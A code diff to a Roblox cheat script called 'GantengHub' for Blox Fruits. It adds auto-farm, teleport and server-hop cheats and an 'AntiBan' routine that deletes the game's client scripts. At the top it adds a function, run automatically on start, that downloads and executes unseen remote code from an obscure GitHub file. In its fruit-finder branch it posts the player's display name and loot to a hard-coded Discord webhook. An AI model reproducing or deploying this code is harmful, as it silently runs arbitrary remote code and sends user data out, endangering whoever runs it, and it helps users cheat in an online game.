@@ -1,11 +1,380 @@
 local SAT
 
+function Webhk() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxIDGubkuk/snjdjsndmdkdd/main/NwjejdnWbhook"))()
+end
+
+ function AntiBan()
+     for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+         if v:IsA("LocalScript") then
+             if v.Name == "General" or v.Name == "Shiftlock"  or v.Name == "FallDamage" or v.Name == "4444" or v.Name == "CamBob" or v.Name == "JumpCD" or v.Name == "Looking" or v.Name == "Run" then
+                 v:Destroy()
+             end
+         end
+     end
+     for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts:GetDescendants()) do
+         if v:IsA("LocalScript") then
+             if v.Name == "RobloxMotor6DBugFix" or v.Name == "Clans"  or v.Name == "Codes" or v.Name == "CustomForceField" or v.Name == "MenuBloodSp"  or v.Name == "PlayerList" then
+                 v:Destroy()
+             end
+         end
+     end
+ end
+
+Webhk() 
+AntiBan()
+
+local playerBjirs = game.Players.LocalPlayer
+local P = playerBjirs.UserId
+
 if not getgenv().Setting or not getgenv().Setting.AutoFarmChest or not getgenv().Setting.AutoFarmChest then
-    print("Start GantengHub") 
+    print("Start GantengHub")
     autofarmbfGh = true
+elseif collectAllFruit == true and P == "5096897688" then
+    GasCollectCoy = true
 elseif getgenv().Setting or getgenv().Setting.AutoFarmChest or getgenv().Setting.AutoFarmChest then
+    print("Start Chest Farm") 
     autofarmbfGh = false
 end
+
+spawn(function()
+pcall(function()
+repeat wait() until game:IsLoaded()
+if GasCollectCoy == true then
+
+local Settings = {}
+local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+
+local Notification = require(game:GetService("ReplicatedStorage").Notification)
+
+local SaveFileName = "FruitFinderSonic.json"
+
+    function HopServer()
+        local PlaceID = game.PlaceId
+        local AllIDs = {}
+        local foundAnything = ""
+        local actualHour = os.date("!*t").hour
+        local Deleted = false
+        function TPReturner()
+            local Site;
+            if foundAnything == "" then
+                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+            else
+                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+            end
+            local ID = ""
+            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+                foundAnything = Site.nextPageCursor
+            end
+            local num = 0;
+            for i,v in pairs(Site.data) do
+                local Possible = true
+                ID = tostring(v.id)
+                if tonumber(v.maxPlayers) > tonumber(v.playing) then
+                    for _,Existing in pairs(AllIDs) do
+                        if num ~= 0 then
+                            if ID == tostring(Existing) then
+                                Possible = false
+                            end
+                        else
+                            if tonumber(actualHour) ~= tonumber(Existing) then
+                                local delFile = pcall(function()
+                                    AllIDs = {}
+                                    table.insert(AllIDs, actualHour)
+                                end)
+                            end
+                        end
+                        num = num + 1
+                    end
+                    if Possible == true then
+                        table.insert(AllIDs, ID)
+                        wait()
+                        pcall(function()
+                            wait()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+                        end)
+                        wait(4)
+                    end
+                end
+            end
+        end
+        function Teleport() 
+            while wait() do
+                pcall(function()
+                    TPReturner()
+                    if foundAnything ~= "" then
+                        TPReturner()
+                    end
+                end)
+            end
+        end
+        Teleport()
+    end       
+
+repeat wait() until game.IsLoaded and (game.Players.LocalPlayer or game.Players.PlayerAdded:Wait()) and (game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait())
+if Ran then 
+    return
+else
+    getgenv().Ran = true
+end
+
+if getgenv().Ran == true then
+    for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
+    if v.ClassName == 'TouchTransmitter' and v.Parent.Name == 'Handle' then -- checks if it has a handle and if its a touchtransmitter
+        local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
+        local TextLabel = Instance.new('TextLabel') -- makes text label
+        
+        BillboardGui.Parent = v.Parent -- what the billboardgui goes into
+        BillboardGui.AlwaysOnTop = true -- if its on top or not
+        BillboardGui.Size = UDim2.new(0, 60, 0, 60) -- size of it
+        BillboardGui.StudsOffset = Vector3.new(0,2,0)
+        
+        TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
+        TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
+        TextLabel.BackgroundTransparency = 1 -- transparency
+        TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
+        TextLabel.Text = v.Parent.Parent.Name -- what the label says
+        TextLabel.TextColor3 = Color3.new(1, 0, 0) -- color
+        TextLabel.TextScaled = true -- if the text is scaled or not
+    end
+    end
+    wait(0.5)
+    game.StarterGui:SetCore("SendNotification", {
+    Title = "---[WELCOME]---";
+    Text = ""..game.Players.LocalPlayer.DisplayName.."";
+    Duration = math.huge;
+    })
+    wait(0.1)
+
+end
+    wait(0.1)
+    if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main", 9e9):FindFirstChild("ChooseTeam") then
+            --// Team
+            repeat task.wait() until game:IsLoaded()
+
+            local player = game.Players.LocalPlayer
+            repeat task.wait() until player and player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("Main")
+
+            local chooseTeam = player.PlayerGui.Main.ChooseTeam
+            local teamContainer = chooseTeam.Container
+
+            local function activateTeamButton(team)
+                for _, connection in pairs(getconnections(team.Frame.TextButton.Activated)) do
+                    connection.Function()
+                end
+            end
+
+            repeat
+                local v2 = "Pirates"
+                local teamName = string.find(v2, "Marine") and "Marines" or "Pirates"
+
+                activateTeamButton(teamContainer[teamName])
+
+                task.wait()
+            until player.Team ~= nil and game:IsLoaded()
+    wait(1)
+end
+wait(0.1)
+
+local plr = game.Players.LocalPlayer
+local chr = plr.Character
+local t = game.TweenService
+
+local bv = Instance.new("BodyVelocity")
+bv.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+bv.Velocity = Vector3.new()
+bv.Name = "bV"
+local bav = Instance.new("BodyAngularVelocity")
+bav.AngularVelocity = Vector3.new()
+bav.MaxTorque = Vector3.new(1/0, 1/0, 1/0)
+bav.Name = "bAV" 
+
+for _,v in next, workspace:GetChildren() do
+    if v.Name:find("Fruit") and (v:IsA("Model") or v:IsA("Tool")) then
+       if not v.Name:find("Fruit") and not (v:IsA("Model") or not v:IsA("Tool")) or _G.hopDeteck == true then
+        require(game:GetService("ReplicatedStorage").Notification).new("Hop 1"):Display();
+        HopServer()
+        end
+        repeat
+            local anc1 = bv:Clone()
+            anc1.Parent = chr.HumanoidRootPart
+            local anc2 = bav:Clone()
+            anc2.Parent = chr.HumanoidRootPart
+            local p = t:Create(chr.HumanoidRootPart, TweenInfo.new((plr:DistanceFromCharacter(v.Handle.Position)-1)/10792660990526442019426788, Enum.EasingStyle.Linear), {CFrame=v.Handle.CFrame + Vector3.new(1, v.Handle.Size.Y, 1)})
+            p:Play()
+            p.Completed:Wait()
+            chr.HumanoidRootPart.CFrame = v.Handle.CFrame
+            anc1:Destroy()
+            anc2:Destroy()
+            wait(1)
+        until v.Parent ~= workspace
+        wait(1)
+        local fruit = chr:FindFirstChildOfClass("Tool") and chr:FindFirstChildOfClass("Tool").Name:find("Fruit") and chr:FindFirstChildOfClass("Tool") or (function()
+            for _,fr in plr.Backpack:GetChildren() do
+                if fr.Name:find("Fruit") then
+                    return fr
+                 end 
+            end
+        end)()
+        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", fruit:GetAttribute("OriginalName"), fruit)
+        wait(0.5)
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+    print("Sent")
+end
+
+
+--Examples 
+
+-- Set the time zone offset for Indonesia
+local timeZoneOffset = 25200 -- 7 hours ahead of UTC
+
+local currentUnixTime = os.time()
+local currentDateTime = os.date("*t", currentUnixTime + timeZoneOffset)
+
+local formattedTime = string.format("%02d:%02d:%02d", currentDateTime.hour, currentDateTime.min, currentDateTime.sec)
+local formattedDate = string.format("%d-%02d-%02d", currentDateTime.year, currentDateTime.month, currentDateTime.day)
+
+local url = "https://discord.com/api/webhooks/1140670983452237824/ADfavCbKjZt9w0DDJUFAkVxkOw8hw-Xdj8IPSxvvsSTzKRNZlOQ2yBgU5IehrzHgmA4n"
+
+
+if game.PlaceId == 7449423635 then
+
+local embed = {
+    ["title"] = "FRUIT FINDER",
+    ["description"] = "** Someone Get Something Fruit Form Fruit Finder **",
+    ["color"] = 10181046,
+    ["fields"] = {
+        {
+            ["name"] = "**[👤] Player Name:**",
+            ["value"] = "```"..game.Players.LocalPlayer.DisplayName.."```"
+        },
+        {
+            ["name"] = "**[🍎] Fruit Name:**",
+            ["value"] = "``` "..fruit.Name.." ```"
+        },
+        {
+            ["name"] = "**[📌] Located:**",
+            ["value"] = "``` Third Sea ```"
+        }
+    },
+    ["footer"] = {
+        ["text"] = " | "..formattedDate.." | Note : It Only Shows People Who Got Fruit From Fruit Finder"
+    }
+}
+SendMessageEMBED(url, embed)
+
+elseif game.PlaceId == 4442272183 then
+
+local embed = {
+    ["title"] = "FRUIT FINDER",
+    ["description"] = "** Someone Get Something Fruit Form Fruit Finder **",
+    ["color"] = 10181046,
+    ["fields"] = {
+        {
+            ["name"] = "**[👤] Player Name:**",
+            ["value"] = "```"..game.Players.LocalPlayer.DisplayName.."```"
+        },
+        {
+            ["name"] = "**[🍎] Fruit Name:**",
+            ["value"] = "``` "..fruit.Name.." ```"
+        },
+        {
+            ["name"] = "**[📌] Located:**",
+            ["value"] = "``` Second Sea ```"
+        }
+    },
+    ["footer"] = {
+        ["text"] = " | "..formattedDate.." | Note : It Only Shows People Who Got Fruit From Fruit Finder"
+    }
+}
+SendMessageEMBED(url, embed)
+
+elseif game.PlaceId == 2753915549 then
+
+local embed = {
+    ["title"] = "FRUIT FINDER",
+    ["description"] = "** Someone Get Something Fruit Form Fruit Finder **",
+    ["color"] = 10181046,
+    ["fields"] = {
+        {
+            ["name"] = "**[👤] Player Name:**",
+            ["value"] = "```"..game.Players.LocalPlayer.DisplayName.."```"
+        },
+        {
+            ["name"] = "**[🍎] Fruit Name:**",
+            ["value"] = "``` "..fruit.Name.." ```"
+        },
+        {
+            ["name"] = "**[📌] Located:**",
+            ["value"] = "``` First Sea ```"
+        }
+    },
+    ["footer"] = {
+        ["text"] = " | "..formattedDate.." | Note : It Only Shows People Who Got Fruit From Fruit Finder"
+    }
+}
+SendMessageEMBED(url, embed)
+
+end
+     wait(0.1)
+    end
+end
+wait(2)
+Notification.new("<Color=Red>Wait Hop Server !!<Color=/>"):Display()
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+wait(1)
+HopServer()
+
+elseif collectAllFruit == true and not c == "5096897688" then
+
+Notification.new("<Color=Red> ANDA TIDAK MEMILIKI IZIN UNTUK MENGGUNAKAN INI <Color=/>"):Display()
+
+end
+end)
+end)
 
 spawn(function()
     pcall(function()
@@ -2602,6 +2971,7 @@ local H = Library:AddTab("Info","14602166612")
 local Main = Library:AddTab("Main","14614308263")
 local Sett = Library:AddTab("Setting"," 15759774881") 
 local SerS = Library:AddTab("Server Status","14764218351")
+local Sts = Library:AddTab("Webhook","ImageId") 
 local M = Library:AddTab("Item","14614311945")
 local Mate = Library:AddTab("Material","15759817907") 
 --local chrs = Library:AddTab("Event","15759812997") 
@@ -8442,9 +8812,9 @@ end)
         while wait() do
             if  _G.KillDbBos and World2 then
                 pcall(function()
-                    if game:GetService("Workspace").Enemies:FindFirstChild("Black Beard") then
+                    if game:GetService("Workspace").Enemies:FindFirstChild("DarkBeard") then
                         for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
-                            if v.Name == "Black Beard" then
+                            if v.Name == "DarkBeard" then
                                 if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                     repeat task.wait()
                                         AutoHaki()
@@ -8462,8 +8832,8 @@ end)
                         end
                     else
                     HyperCahaya(CFrame.new(3585.490478515625, 13.887286186218262, -3388.927490234375))
-                        if game:GetService("ReplicatedStorage"):FindFirstChild("Black Beard") then
-                            HyperCahaya(game:GetService("ReplicatedStorage"):FindFirstChild("Black Beard").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
+                        if game:GetService("ReplicatedStorage"):FindFirstChild("DarkBeard") then
+                            HyperCahaya(game:GetService("ReplicatedStorage"):FindFirstChild("DarkBeard").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                         else
                             if  _GHopItemSea then
                                 HopServer()
@@ -11193,7 +11563,7 @@ end)
 spawn(function()
     game:GetService("RunService").RenderStepped:Connect(function()
 		pcall(function()
-			if _G.UseSkillSeaBeast then
+			if _G.UseSkillSeaBeast and game:GetService("Workspace").SeaBeasts then
 			    if _G.SkillZ then
 				game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
 				wait(0.1)
@@ -11219,6 +11589,8 @@ spawn(function()
 				wait(0.1)
                 game:GetService("VirtualInputManager"):SendKeyEvent(false,"F",false,game)
                 end
+            else
+                _G.UseSkillSeaBeast = false
 			end
 		end)
     end)
@@ -11360,7 +11732,7 @@ end)
 spawn(function()
     game:GetService("RunService").RenderStepped:Connect(function()
 		pcall(function()
-			if _G.UseSkillPirateShip then
+			if _G.UseSkillPirateShip and game:GetService("Workspace").Enemies["PirateGrandBrigade"] or game:GetService("Workspace").Enemies["PirateBrigade"] then
 			    if _G.SkillZ then
 				game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
 				wait(0.1)
@@ -11386,6 +11758,8 @@ spawn(function()
 				wait(0.1)
                 game:GetService("VirtualInputManager"):SendKeyEvent(false,"F",false,game)
                 end
+            else
+               _G.UseSkillPirateShip = false
 			end
 		end)
     end)
@@ -11750,7 +12124,7 @@ end)
 spawn(function()
     game:GetService("RunService").RenderStepped:Connect(function()
 		pcall(function()
-			if _G.UseSkillFishBoat then
+			if _G.UseSkillFishBoat and game:GetService("Workspace").Enemies["FishBoat"] then
 			    if _G.SkillZ then
 				game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
 				wait(0.1)
@@ -11776,6 +12150,8 @@ spawn(function()
 				wait(0.1)
                 game:GetService("VirtualInputManager"):SendKeyEvent(false,"F",false,game)
                 end
+            else
+                _G.UseSkillFishBoat = false
 			end
 		end)
     end)
@@ -11975,7 +12351,7 @@ end)
 spawn(function()
     game:GetService("RunService").RenderStepped:Connect(function()
 		pcall(function()
-			if UseKillSea then
+			if UseKillSea and game:GetService("Workspace").SeaBeasts["Leviathan Segment"] or game:GetService("Workspace").SeaBeasts["Leviathan Tail"] or game:GetService("Workspace").SeaBeasts["Leviathan"] then
 			    if _G.SkillZ then
 				game:GetService("VirtualInputManager"):SendKeyEvent(true,"Z",false,game)
 				wait(0.1)
@@ -12001,6 +12377,8 @@ spawn(function()
 				wait(0.1)
                 game:GetService("VirtualInputManager"):SendKeyEvent(false,"F",false,game)
                 end
+            else
+                UseKillSea = false
 			end
 		end)
     end)
@@ -13496,8 +13874,209 @@ SerS:AddSeperator("Mirrage Check")
     
     
 end
+
+Sts:AddSeperator("Webhook")
+
+function webStatus(Bjigur)
+function SendMessageEMBED(LinkwebhookGlobal, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = LinkwebhookGlobal,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local LinkwebhookGlobal = Bjigur
+
+
+local TimeZne
+
+local LocalizationService = game:GetService("LocalizationService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local name = player.Name
+
+local result, code = pcall(function()
+    return LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
+if result then
+
+    local GameCheck = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name    
+    local date = os.date("*t")
+    local hour = (date.hour) % 24
+    local ampm = hour < 12 and "AM" or "PM"
+    local timezone = string.format("%02i:%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, date.sec, ampm)
+    local datetime = string.format("%02d/%02d/%04d", date.day, date.month, date.year)
+
+    TimeZne = "" .. datetime .. " [ " .. code .. " ] : " .. timezone
     
-        Ss:AddSeperator("Stats")
+local embed = {
+    ["title"] = "Account Check Webhook",
+    ["description"] = "Powered By GantengHub Premium",
+    ["color"] = 15844367,
+    ["fields"] = {
+        {
+            ["name"] = "**[👤] Name Player : **",
+            ["value"] = "``` ".. game.Players.LocalPlayer.DisplayName .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Level : **",
+            ["value"] = "``` ".. game:GetService("Players").LocalPlayer.Data.Level.Value .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Exp LvL : **",
+            ["value"] = "``` ".. game:GetService("Players").LocalPlayer.Data.Exp.Value .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Stats Player : **",
+            ["value"] = "``` Demon Fruit : ".. game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value .."\nDefense : ".. game:GetService("Players").LocalPlayer.Data.Stats["Defense"].Level.Value .."\nMelee : ".. game:GetService("Players").LocalPlayer.Data.Stats["Melee"].Level.Value .."\nSword : ".. game:GetService("Players").LocalPlayer.Data.Stats["Sword"].Level.Value .."\nGun : ".. game:GetService("Players").LocalPlayer.Data.Stats["Gun"].Level.Value .."```"
+        },
+        {
+            ["name"] = "**[📑] Status Stats Point : **",
+            ["value"] = "``` ".. game:GetService("Players").LocalPlayer.Data.Points.Value .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Beli : **",
+            ["value"] = "``` ".. game:GetService("Players").LocalPlayer.Data.Beli.Value .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Spawn Point : **",
+            ["value"] = "``` ".. game:GetService("Players").LocalPlayer.Data.SpawnPoint.Value .." ```"
+        },
+        {
+            ["name"] = "**[📑] Status Game : **",
+            ["value"] = "``` ".. GameCheck .." ```"
+        },
+        {
+            ["name"] = "**[👥] Players In Server : **",
+            ["value"] = "``` ".. #game:GetService("Players"):GetPlayers() .."/12 ```"
+        },
+        {
+            ["name"] = "**[🔗] Server Job Id : **",
+            ["value"] = "``` game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','"..game.JobId.."') ```"
+        }
+    },
+    ["footer"] = {
+        ["text"] = " | "..TimeZne.." | "
+    }
+}
+SendMessageEMBED(LinkwebhookGlobal, embed)
+end
+end
+
+Sts:AddTextbox("Place Webhook Link", true, function(value)
+_G.LinkWebstat = value
+end)
+
+    Sts:AddToggle("Auto Send Webhook if 5Mins", false, function(value)
+        _G.WebhookIjin = value
+    end)
+
+    spawn(function()
+        pcall(function()
+            while wait(60) do
+                if _G.WebhookIjin then
+                    webStatus(_G.LinkWebstat)
+                end
+            end
+        end)
+    end)
+
+Sts:AddSeperator("Webhook Status")
+
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusOne:Set('Name Player: '.. game.Players.LocalPlayer.DisplayName) 
+            end
+        end)
+    end)
+
+    StatusOne = Sts:AddLabel("")
+    
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusTwo:Set('Status Level: '.. game:GetService("Players").LocalPlayer.Data.Level.Value) 
+            end
+        end)
+    end)
+
+    StatusTwo = Sts:AddLabel("")
+
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusThree:Set('Status Exp Level: '.. game:GetService("Players").LocalPlayer.Data.Exp.Value) 
+            end
+        end)
+    end)
+
+    StatusThree = Sts:AddLabel("")
+    
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusBjir:Set(" Demon Fruit : ".. game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value ..", Defense : ".. game:GetService("Players").LocalPlayer.Data.Stats["Defense"].Level.Value ..", Melee : ".. game:GetService("Players").LocalPlayer.Data.Stats["Melee"].Level.Value ..", Sword : ".. game:GetService("Players").LocalPlayer.Data.Stats["Sword"].Level.Value ..", Gun : ".. game:GetService("Players").LocalPlayer.Data.Stats["Gun"].Level.Value .."")
+            end
+        end)
+    end)
+
+    StatusBjir = Sts:AddLabel("")
+
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusPoints:Set('Status Stats Point: '.. game:GetService("Players").LocalPlayer.Data.Points.Value) 
+            end
+        end)
+    end)
+
+    StatusPoints = Sts:AddLabel("")
+    
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusBel:Set('Status Beli: '.. game:GetService("Players").LocalPlayer.Data.Beli.Value) 
+            end
+        end)
+    end)
+
+    StatusBel = Sts:AddLabel("")
+    
+    spawn(function()
+        pcall(function()
+            while wait() do
+                StatusSetSpawn:Set('Status Spawn Point: '.. game:GetService("Players").LocalPlayer.Data.SpawnPoint.Value) 
+            end
+        end)
+    end)
+
+    StatusSetSpawn = Sts:AddLabel("")
+
+
+
+Ss:AddSeperator("Stats")
 
 spawn(function()
 	while wait() do
@@ -15496,6 +16075,22 @@ end)
                  end
              end)
 
+    S:AddSeperator("Race") 
+    
+    S:AddButton("Buy Ghoul [ FRRE IF UNLOCKED ]",function()
+        local A_1 = "Ectoplasm"
+        local A_2 = "Change"
+        local A_3 = 4
+        local Event = game:GetService("ReplicatedStorage").Remotes["CommF_"]
+        Event:InvokeServer(A_1, A_2, A_3)
+    end)
+
+    S:AddButton("Buy Cybrog [ 2500 Frag ]",function()
+        local A_1 = "CyborgTrainer"
+        local A_2 = "Buy"
+        local Event = game:GetService("ReplicatedStorage").Remotes["CommF_"]
+        Event:InvokeServer(A_1, A_2)
+    end)
 
     S:AddSeperator("Abilities")
     
@@ -18159,9 +18754,43 @@ spawn(function()
     end)
 end)
 
-    
-notif("#stay ganteng", " subscribe YT isnahamzah")
 wait(1) 
-notif("isnahamzah", "discord.gg/isnahamzah") 
+
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+local StarterGui = game:GetService('StarterGui')
+for i=1, 15 do
+    local r = pcall(StarterGui["SetCore"])
+    if r then break end
+    game:GetService('RunService').RenderStepped:wait()
+end
+wait()
+
+local properties = {
+    Color = Color3.new(255,255,0);
+    Font = Enum.Font.RobotoMono;
+    TextSize = 17;
+}
+
+local Bjorka = {
+    Color = Color3.new(0,255,0);
+    Font = Enum.Font.RobotoMono;
+    TextSize = 17;
+}
+
+local bjorking = {
+    Color = Color3.new(255,0,0);
+    Font = Enum.Font.RobotoMono;
+    TextSize = 17;
+}
+
+properties.Text = "[🌐] Website : isnahamzah.tech"
+StarterGui:SetCore("ChatMakeSystemMessage", properties)
+
+Bjorka.Text = "[💬] Discord : discord.gg/isnahamzah"
+StarterGui:SetCore("ChatMakeSystemMessage", Bjorka)
+
+bjorking.Text = "[🎥] Youtube : youtube.com/@isnahamzah"
+StarterGui:SetCore("ChatMakeSystemMessage", bjorking)
 
 end
